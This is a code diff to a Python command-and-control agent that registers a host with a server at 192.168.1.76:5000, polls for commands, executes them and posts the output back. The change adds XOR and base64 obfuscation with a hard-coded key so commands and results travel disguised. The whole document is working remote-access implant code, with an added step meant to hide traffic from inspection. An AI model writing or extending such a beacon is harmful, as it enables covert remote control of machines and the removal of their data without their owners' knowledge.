@@ -1,9 +1,20 @@
 import json, subprocess, time, uuid, socket, requests
+import base64
+
 
 SERVER_URL = "http://192.168.1.76:5000"
 hostname = socket.gethostname()
 mac = uuid.getnode()
 AGENT_ID = f"Agent-{hostname}" 
+
+def xor(data: str, key="secret") -> str:
+    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+
+def encrypt(data: str, key="secret") -> str:
+    return base64.b64encode(xor(data, key).encode()).decode()
+
+def decrypt(data: str, key="secret") -> str:
+    return xor(base64.b64decode(data.encode()).decode(), key)
 
 def register_agent():
     
@@ -26,11 +37,13 @@ def heartbeat():
 
 def beacon_command(commands):
     for cmd in commands:
-        output = execute_command(cmd["command"])
+        plain_cmd = decrypt(cmd["command"])  # decrypt before exec
+        output = execute_command(plain_cmd)
         requests.post(f"{SERVER_URL}/result", json={
             "command_id": cmd["command_id"],
-            "result": output
+            "result": encrypt(output)  # encrypt before sending
         })
+
 
 def execute_command(command):
     try:
